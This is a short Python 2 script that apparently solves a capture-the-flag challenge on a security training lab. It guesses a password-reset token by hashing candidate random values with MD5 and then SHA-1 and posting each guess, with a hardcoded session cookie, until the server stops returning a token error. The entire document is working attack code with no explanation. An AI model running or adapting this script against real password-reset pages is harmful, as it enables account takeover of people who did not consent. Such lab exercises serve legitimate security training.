import requests
import time
import hashlib

url='http://lab1.xseclab.com/pentest6_210deacdf09c9fe184d16c8f7288164f/resetpwd.php'
header = {'Cookie': 'saeut=218.108.135.246.1416190347811282; PHPSESSID=5f3d9f5685452d1474f59371067e36af'}

s=requests.session()
f=open('./random.txt','r')
randoms=f.readlines()
#print randoms
for t in randoms:
    m=hashlib.md5(t.strip())
    sha=hashlib.sha1(m.hexdigest())
    data=sha.hexdigest()
    data={'token':data}
    re=s.post(url,headers=header,data=data)
    if 'Token_error' not in re.text:
        print re.text
        break
#t=time.time()
